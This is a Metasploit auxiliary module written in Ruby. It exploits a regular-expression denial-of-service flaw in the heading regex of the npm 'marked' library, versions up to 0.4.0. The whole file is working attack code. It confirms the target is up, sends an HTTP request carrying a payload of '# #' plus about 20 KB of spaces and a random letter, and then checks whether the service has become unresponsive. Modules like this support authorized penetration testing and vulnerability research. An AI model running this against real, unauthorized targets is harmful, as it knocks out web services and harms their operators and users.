##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'marked npm module "heading" ReDoS',
      'Description' => %q{
        This module exploits a Regular Expression Denial of Service vulnerability
        in the npm module "marked". The vulnerable portion of code that this module
        targets is in the "heading" regular expression. Web applications that use
        "marked" for generating html from markdown are vulnerable. Versions up to
        0.4.0 are vulnerable.
      },
      'References'  =>
        [
          ['URL', 'https://blog.sonatype.com/cve-2017-17461-vulnerable-or-not'],
          ['CWE', '400']
        ],
      'Author'      =>
        [
          'Adam Cazzolla, Sonatype Security Research',
          'Nick Starke, Sonatype Security Research'
        ],
      'License'     =>  MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80),
      OptString.new('HTTP_METHOD', [true, 'The default HTTP Verb to use', 'GET']),
      OptString.new('HTTP_PARAMETER', [true, 'The vulnerable HTTP parameters', '']),
      OptString.new('TARGETURI', [true, 'The URL Path to use', '/'])
    ])
  end

  def run
    if test_service
      trigger_redos
      test_service_unresponsive
    else
      fail_with(Failure::Unreachable, "#{peer} - Could not communicate with service.")
    end
  end

  def trigger_redos
    begin
      print_status("Sending ReDoS request to #{peer}.")

      params = {
        'uri' => normalize_uri(target_uri.path),
        'method' => datastore['HTTP_METHOD'],
          ("vars_#{datastore['HTTP_METHOD'].downcase}") => {
            datastore['HTTP_PARAMETER'] =>  "# #" + (" " * 20 * 1024) + Rex::Text.rand_text_alpha(1)
        }
      }

      res = send_request_cgi(params)

      if res
        fail_with(Failure::Unknown, "ReDoS request unsuccessful. Received status #{res.code} from #{peer}.")
      end

      print_status("No response received from #{peer}, service is most likely unresponsive.")
    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to #{peer}.")
    rescue ::Timeout::Error
      print_status("No HTTP response received from #{peer}, this indicates the payload was successful.")
    end
  end

  def test_service_unresponsive
    begin
      print_status('Testing for service unresponsiveness.')

      res = send_request_cgi({
        'uri' => '/' + Rex::Text.rand_text_alpha(8),
        'method' => 'GET'
      })

      if res.nil?
        print_good('Service not responding.')
      else
        print_error('Service responded with a valid HTTP Response; ReDoS attack failed.')
      end
    rescue ::Rex::ConnectionRefused
      print_error('An unknown error occurred.')
    rescue ::Timeout::Error
      print_good('HTTP request timed out, most likely the ReDoS attack was successful.')
    end
  end

  def test_service
    begin
      print_status('Testing Service to make sure it is working.')

      res = send_request_cgi({
        'uri' => '/' + Rex::Text.rand_text_alpha(8),
        'method' => 'GET'
      })

      if res && res.code >= 100 && res.code < 500
        print_status("Test request successful, attempting to send payload. Server returned #{res.code}")
        return true
      else
        return false
      end
    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to #{peer}.")
      return false
    end
  end
end
